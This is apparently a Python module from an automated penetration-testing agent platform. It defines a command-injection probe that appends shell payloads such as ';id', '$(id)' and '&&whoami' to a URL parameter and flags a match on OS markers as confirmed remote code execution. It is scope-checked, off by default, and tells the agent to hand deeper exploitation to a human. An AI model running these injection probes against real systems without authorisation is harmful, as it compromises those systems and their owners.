"""SkillRce — command injection probe.

For each shell-metacharacter payload in `_payloads.RCE_PROBES`, substitutes
the param value with `<original><payload>` and checks the response for
OS-specific markers (Linux `uid=N(name)`, Windows `<DIR>` listings, etc.).

Marked `danger="exploit"` because successful RCE is full system compromise
— gated behind the orchestrator's `allow_exploit` flag. Even probing can
trigger downstream side effects (shell commands actually executing on the
target), so off-by-default is correct.

Severity:
  - critical : marker matched (confirmed command execution)
  - info     : no markers
"""
from __future__ import annotations
import re
from typing import Optional
from urllib.parse import urlparse, urlencode, urlunparse, parse_qsl

import requests

from services.skills.base import Skill, SkillResult, register
from services.skills._payloads import RCE_PROBES


_HEADERS = {"User-Agent": "Mozilla/5.0 ZeekGlare-Arena-RCE"}


def _swap(url: str, param: str, value: str) -> str:
    p = urlparse(url)
    qs = parse_qsl(p.query, keep_blank_values=True)
    new_qs = [(k, value if k == param else v) for k, v in qs]
    if not any(k == param for k, _ in qs):
        new_qs.append((param, value))
    return urlunparse((p.scheme, p.netloc, p.path, p.params, urlencode(new_qs), p.fragment))


@register
class SkillRce(Skill):
    name        = "skill_rce"
    danger      = "exploit"   # off unless allow_exploit
    description = (
        "Probe a URL+param for command injection. Tries shell-metacharacter "
        "payloads (;id, |id, `id`, $(id), &&id) and Windows variants "
        "(&&whoami, |whoami, &dir), checks response for OS-level markers "
        "(uid=N(name), Windows username\\domain). Critical when confirmed "
        "— full system compromise. Off-by-default (requires 'Allow active "
        "exploitation' in arena setup)."
    )
    guidance    = (
        "RCE attempts can have real side effects on the target (executed "
        "commands, audit-log entries, IDS alerts). Try the stealthiest "
        "probe first (just `id` is enough for evidence), don't escalate to "
        "destructive payloads. For deeper exploitation, hand off to a human."
    )
    input_schema = {
        "type": "object",
        "properties": {
            "url":   {"type": "string", "description": "URL to probe."},
            "param": {"type": "string", "description": "Param name."},
            "preserve_original": {"type": "boolean", "default": True,
                                   "description": "Prefix payload with the original param value (so endpoints that require valid input still execute the suffix)."},
        },
        "required": ["url", "param"],
    }

    @classmethod
    def applicable(cls, state) -> bool:
        c = state.asset_counts()
        return c.get("url", 0) > 0 or c.get("param", 0) > 0

    @classmethod
    def dedup_key(cls, args) -> Optional[tuple[str, str, str, str]]:
        return (args.get("url", ""), args.get("param", ""), "rce", "shell_metachar")

    @classmethod
    def run(cls, args, state, agent_id) -> SkillResult:
        url   = (args.get("url") or "").strip()
        param = (args.get("param") or "").strip()
        preserve = bool(args.get("preserve_original", True))
        if not url or not param:
            return SkillResult(ok=False, error="url and param required")
        if not state.in_scope(url):
            return SkillResult(ok=False, error=f"out of scope: {url}")

        # Optionally prefix the existing param value so endpoints that validate
        # input still pass the suffix to the shell.
        original_value = ""
        if preserve:
            qs = parse_qsl(urlparse(url).query, keep_blank_values=True)
            for k, v in qs:
                if k == param:
                    original_value = v; break

        hits = []
        all_probes = []
        for payload, marker_re, os_label in RCE_PROBES:
            value = (original_value + payload) if preserve else payload
            probe = _swap(url, param, value)
            try:
                r = requests.get(probe, headers=_HEADERS, timeout=12,
                                 allow_redirects=False, verify=False)
                body = r.text or ""
            except Exception as e:
                all_probes.append({"payload": payload, "error": str(e)})
                continue
            rec = {"payload": payload, "os": os_label, "status": r.status_code,
                   "length": len(body)}
            all_probes.append(rec)
            m = re.search(marker_re, body, re.M)
            if m:
                rec["match"]   = m.group(0)
                rec["context"] = body[max(0, m.start() - 60): m.end() + 60]
                hits.append(rec)

        if hits:
            ev_lines = [f"URL: {url}  Param: {param}  Original value: {original_value!r}"]
            for h in hits[:5]:
                ev_lines.append(
                    f"[{h['os']}] payload={h['payload']!r} → match={h['match']!r}"
                )
                ev_lines.append(f"  context: {h['context'][:200]!r}")
            evidence = "\n".join(ev_lines)
            os_set = sorted({h["os"] for h in hits})
            return SkillResult(
                ok=True,
                summary=f"RCE CONFIRMED ({', '.join(os_set)}): {len(hits)} payload(s) executed.",
                evidence=evidence,
                finding={
                    "vuln_type":   "rce",
                    "severity":    "critical",
                    "target":      url,
                    "location":    f"{url} param={param}",
                    "description": (
                        f"Command injection — param '{param}' is passed to a shell "
                        f"({', '.join(os_set)}). {len(hits)} probe(s) executed and returned "
                        "OS-level output (id/uname/whoami/dir markers in response). Full "
                        "system compromise: read filesystem, pivot to internal network, "
                        "exfiltrate data."
                    ),
                    "evidence":    evidence,
                },
                extras={"hits": hits, "os_label": os_set},
            )

        return SkillResult(
            ok=True,
            summary=f"No RCE detected ({len(all_probes)} payloads tried; no OS markers).",
            extras={"probes": all_probes[:5]},
        )
